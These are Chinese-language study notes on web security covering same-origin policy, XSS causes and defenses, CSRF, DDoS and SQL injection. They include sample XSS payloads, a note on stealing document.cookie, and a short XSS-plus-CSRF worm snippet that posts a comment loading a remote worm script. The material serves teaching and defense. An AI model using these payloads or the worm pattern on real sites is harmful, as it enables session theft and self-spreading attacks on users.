## 同源策略
  + 协议不一样是不同源的
  ```
    https
    http
  ```
  + www 子域名和不带也是不同源的
  ```
    https://xx.com
    https://www.xx.com
  ```

  + 端口不一致也是不同源的

## 漏洞成因
1. 网页劫持（使用 https）
  > + dns 劫持
  > + 跳到假网站/页面/脚本被篡改，插入恶意代码

2. 缓存投毒，访问 A 站点时，加载了 B 站点的通用脚本，缓存时间非常长。再访问 B 站点时中招（使用 https）

3. 文件投毒（使用可靠源）
  > + 在非官方站点下载了某个库
  > + 官方下载地址被攻击
  > + 迅雷网络加速缓存了错误的文件
  > + 引用了不可信的第三方 dns 上的资源 

4. 客户端投毒，被安装了恶意插件，尤其是 chrome 插件（谨慎筛选插件，异站异密，二次验证）

5. 自身安全漏洞造成的猥琐绕过，产生反射性和存储型 xss

## XSS
### 成因
1. 提前闭合标签
2. 注释后续代码

```html
<img src="https://xxx.com/favicon.icon" onload=" " />
    ^             ^                   ^^        ^^ ^
    |             |                   ||        || |

    1             4                   51        61 7

1 处可以插入任意空格、回车、/
4 处可以是 http https ftp 等各种协议 url
5 处可以是双引号、单引号。也可以没有引号，在 ie 中可以是反引号
6 处可以是任意 js，能直接访问 document 作用域，字符可以被 html 转译
7 处可以不结尾，可以用 / 结尾
```

### Payload
实现 xss 攻击的恶意脚本称为 xss payload
+ 窃取用户的 `document.cookie`
+ 识别用户浏览器 `navigator.userAgent`
+ 伪造请求 `GET` `POST` 请求
+ xss 钓鱼，通过 xss 向网页上注入钓鱼链接，让用户访问假冒的网站

前面三个都是自动的
1. `<input onfocus=write(1) autofocus>`
2. `<svg onload=alert(1)>`
3. `<script>alert(1)<script/>`
4. `<a href="javascript:alert(1)">clickme</a>`

可以通过给 cookie 设置 `httpOnly` 属性来让脚本无法读取 cookie，但自己也不能用了，非根本性解决 xss

### 防护原则
1. 安全第一，不轻信任何数据，不轻信队友
  > + 慎用公共 cdn 资源
  > + 慎用第三方服务 jsonp 接口
  > + 不轻信用户输入（把所有的用户想象成黑客）
  > + 不轻信后端吐回的数据

2. 未雨绸缪
  > + html 正文：实体字符转译
  > + html 标签：实体字符转译
  > + html onxxx 事件属性：js 转译
  > + url：url 转译
  > + 用户富文本输入：后端白名单标签过滤，使用开源库，不要用正则过滤（正则过滤不干净的，太多种情况了）
  > + 推荐使用：`https://www.npmjs.com/package/sanitize-html`

  ```js
  function encode(html) {
    return html.replace(/[<>&"']/g, v => (
      {
        '<':'&lt;',
        '>':'&gt;',
        '&':'&amp;',
        "'": '&#39;',
        '"':'&quot;',
      }[v]
    ))
  }
  ```

3. demo
  ```html
    no: 不要在这里直接插入不可信数据

    <script>$no</script>
    <!-- $no -->
    <div $no=""></div>
    <div id="$no"></div>
    <$no href="..."></a>
    <a href="$no"></a>
    <input type="text" $no />
    <style>$no</style>
  ```

4. 配置安全协议头
  1. `https://imququ.com/post/web-security-and-response-header.html`


### 存储型 xss
1. 由于后端过滤不干净 + 前端展示时没有正确的编码，而造成永久性的 xss
2. 修复：后端一般不会轻易对大量已存数据再编辑。需要对新写入的数据修正存储逻辑。前端做好正确的编码转译

### 反射性（非持久性） xss
诱导用户点击恶意链接来造成一次性攻击
1. 黑客把带有恶意脚本代码参数的 URL 地址发送给用户
2. 用户点击此链接
3. 服务器端获取请求参数并直接使用，服务器反射回结果页面

  > + 反射性 xss 攻击是一次性的，必须通过用户点击链接才能发起
  > + 一些浏览器如 chrome 内置了一些 xss 过滤器，可以防止大部分反射型 xss 攻击
  > + 反射性 xss 其实就是服务器没有对恶意的用户输入进行安全处理就直接反射响应内容，导致恶意代码在浏览器中执行的一种 xss 漏掉

### 渗透测试
1. 通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法
2. 一般大公司都有专门的安全团队用对自己产品做渗透测试。作为公司开发人员，不要动歪脑子，如屏蔽渗透服务器 `ip/ua`，害人害己

## CSRF
其实我感觉 csrf 的主要问题就是在 cookie 身上，解决办法主要也是围绕 cookie 来解决
+ `Cross-site request forgery` 跨站请求伪造
+ 增删改操作严禁使用 `GET` 请求（幂等）
+ `POST` 等其他协议同样能被 `CSRF`
+ 敏感操作一定要判断请求来源、在 cookie 之外的地方增加加密串，和请求一同带上，甚至发送验证码给用户
+ refer 验证（但是 refer 可以伪造，比如在 node 中请求）
+ token

### xss + csrf (蠕虫)
不断传播的 xss + csrf 攻击
```js
  const attack = '<script src="http://localhost:3001/worm.js"></script>'
  $.post('/api/comments', { content: `haha, ${attack}` })
```

### DDOS 攻击
分布式拒绝服务
+ 黑客控制大量的肉鸡向受害主机发送非正常请求，导致目标主机耗尽资源不能为合法用户提供服务
+ 验证码是我们在互联网十分常见的技术之一。不得不说验证码是能够有效地防止多次重复请求的行为
+ 限制请求频率是最常见的针对 DDOS 攻击的防御措施（比如 github 就是每个小时 5000 次）
+ 设置自己业务为分布式服务，防止单点失效
+ 使用主流云系统和 CDN（云和 CDN 其自身有 DDOS 的防范作用）
+ 优化资源的使用来提高 web server 的负载能力
+ 买高防 ip

### http 劫持
+ 使用 https

### SQL 注入
+ 对查询语句中字符做正确的转译
+ 最小化数据库账户使用权限
+ 不开发不必要但权力过大的功能（比如查用户的信息，扩大到查询所有用户的信息）
+ 不要过于信任用户所输入的数据，限制输入的字符数，以及对用户输入的数据做潜在指令的检查

### 一些 xss 的小游戏网站
+ [美团关于 xss 的文字](https://tech.meituan.com/2018/09/27/fe-security.html)
+ [`alert(1) to win`](https://alf.nu/alert1)
+ [`prompt(1) to win`](http://prompt.ml/0)
+ [`XSS game`](https://xss-game.appspot.com/)